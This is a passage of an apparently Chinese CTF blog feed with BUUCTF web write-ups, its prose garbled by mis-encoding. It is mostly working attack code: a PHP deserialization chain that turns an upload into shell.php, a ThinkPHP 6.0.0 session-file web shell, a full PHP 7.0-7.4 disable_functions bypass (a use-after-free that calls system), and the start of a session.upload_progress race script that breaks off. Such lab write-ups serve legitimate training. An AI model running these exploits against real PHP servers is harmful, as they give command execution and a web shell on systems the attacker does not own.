class="line">        <span class="keyword">public</span> $img;</span><br><span class="line">        <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;except[<span class="string">&#x27;index&#x27;</span>] = <span class="string">&#x27;upload_img&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/6e6a7627c6f6e9e3a95e30d1de17d47c.png&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename = <span class="string">&#x27;../public/upload/b78934111bc6a120a7957cbc2e531338/shell.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $checker;</span><br><span class="line">        <span class="keyword">public</span> $registed;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a =<span class="keyword">new</span> Register();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç™»å½•æ—¶å°†åºåˆ—åŒ–æ•°æ®å†™å…¥cookie</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/image-20210826233218385.png" alt="image-20210826233218385"></p><p>è¿æ¥ååœ¨æ ¹ç›®å½•æ‰¾åˆ°flag</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/qq_41891666/article/details/107382969">å‚è€ƒé“¾æ¥</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;ä»£ç å®¡è®¡ã€æ–‡ä»¶ä¸Šä¼ ã€ååºåˆ—åŒ–ã€æ–‡ä»¶æ³„éœ²&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GYCTF2020-EasyThinking</title>
    <link href="http://example.com/2021/08/25/GYCTF2020-EasyThinking/"/>
    <id>http://example.com/2021/08/25/GYCTF2020-EasyThinking/</id>
    <published>2021-08-25T07:43:46.074Z</published>
    <updated>2021-08-27T16:15:41.136Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>ThinkPHP6.0.0 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ + disable ç»•è¿‡</p><a id="more"></a></blockquote><p>EasyThinkingâ€¦â€¦åº”è¯¥æ˜¯thinkphp</p><p>æœ‰ç™»å½•å’Œæœç´¢åŠŸèƒ½ï¼Œæœ‰ session åŠŸèƒ½</p><p>æŠ“åŒ…æµ‹è¯•å‘ç°åŒä¸€ä¸ªè´¦æˆ·ï¼Œcookieä¸åŒï¼Œæœç´¢è®°å½•ä¹Ÿä¸åŒ</p><p>æœç´¢è®°å½•å†™åˆ°äº†å¯¹åº”çš„æ–‡ä»¶ä¸­</p><h4><span id="shell">shell</span></h4><p>é¡µé¢æŠ¥é”™ä¸ºï¼š</p><blockquote><p><a href="http://www.thinkphp.cn/">ThinkPHP</a> V6.0.0 { åå¹´ç£¨ä¸€å‰‘-ä¸ºAPIå¼€å‘è®¾è®¡çš„é«˜æ€§èƒ½æ¡†æ¶ } - <a href="https://www.kancloud.cn/manual/thinkphp6_0/">å®˜æ–¹æ‰‹å†Œ</a></p></blockquote><p>æ‰¾ç›¸å…³çš„æ¼æ´â€¦â€¦</p><p><a href="https://blog.csdn.net/zhangchensong168/article/details/104106869">ThinkPHP6ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</a></p><p><a href="https://www.php.cn/phpkj/thinkphp/441728.html">ThinkPHP6 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´åˆ†æ</a></p><p>é€šè¿‡æ§åˆ¶32ä½çš„sessionidï¼Œæ‹¼æ¥ç”Ÿæˆphpæ–‡ä»¶ã€‚</p><p>å†é€šè¿‡æœç´¢åŠŸèƒ½å†™å…¥ä¸€å¥è¯ï¼Œè®¿é—®<code>\runtime\sessionsess_sessid    </code>è·å¾—shell</p><img src="/images/GYCTF2020-EasyThinking/image-20210825155732941.png" alt="image-20210825155732941" style="zoom:67%;"><img src="/images/GYCTF2020-EasyThinking/image-20210825155750857.png" alt="image-20210825155750857" style="zoom:80%;"><h4><span id="diable">diable</span></h4><p>æ‹¿åˆ°shellåï¼Œæ— æƒé™ï¼Œèšå‰‘è‡ªå¸¦çš„æ’ä»¶ä¹Ÿæ— æ³•ç»•è¿‡</p><p>ç›®æ ‡æ˜¯è¿è¡Œæ ¹ç›®å½•ä¸‹çš„ <code>readflag</code> è·å–flag</p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">PHP7.0-7.4ç‰ˆæœ¬çš„çªç ´disable_functionçš„exp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ shellï¼Œè·å–flag</p><p>å‚è€ƒæ–‡ç« :<br><a href="https://www.cnblogs.com/yesec/p/12571861.html">å‚è€ƒé“¾æ¥</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;æ‘˜è¦&lt;br&gt;ThinkPHP6.0.0 ä»»æ„æ–‡ä»¶æ“ä½œæ¼æ´ + disable ç»•è¿‡&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF2020-ezinclude</title>
    <link href="http://example.com/2021/08/24/NPUCTF2020-ezinclude/"/>
    <id>http://example.com/2021/08/24/NPUCTF2020-ezinclude/</id>
    <published>2021-08-24T09:01:21.337Z</published>
    <updated>2021-08-27T16:15:49.893Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜è¦<br>session æ–‡ä»¶ä¸Šä¼ +ç«äº‰    php7 segment faultç‰¹æ€§</p><a id="more"></a></blockquote><p>æ˜¾ç¤ºï¼š</p><blockquote><p>username/password error</p></blockquote><p><img src="/images/NPUCTF2020-ezinclude/image-20210824230329570.png" alt="image-20210824230329570"></p><p>è¿”å›äº†å“ˆå¸Œå€¼ï¼Œè¾“å…¥éªŒè¯åè·³è½¬404ï¼ŒæŠ“åŒ…</p><p>/flflflflag.phpï¼šæ–‡ä»¶åŒ…å«ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">include($_GET[&quot;file&quot;])&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ cmdline å¯è¯»ï¼Œenviron ä¸å¯è¯»â€¦â€¦</p><h4><span id="åˆ©ç”¨sessionupload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«</span></h4><p>å­¦ä¹ äº†ä¸€æ³¢åˆ©ç”¨sessionè¿›è¡Œç«äº‰åŒ…å«ï¼š</p><p><a href="https://www.freebuf.com/vuls/202819.html">åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€</a></p><p><a href="https://blog.csdn.net/qq_52737372/article/details/117789229">æµ…è°ˆPHP_SESSION_UPLOAD_PROGRESSå’Œæ¡ä»¶ç«äº‰çš„å·§å¦™åˆ©ç”¨</a></p><p>æ„Ÿè§‰å¾ˆæ£’â€¦â€¦</p><p>ç«äº‰è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://b4539af9-768c-4832-bbbe-2d6d2b0da7a3.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 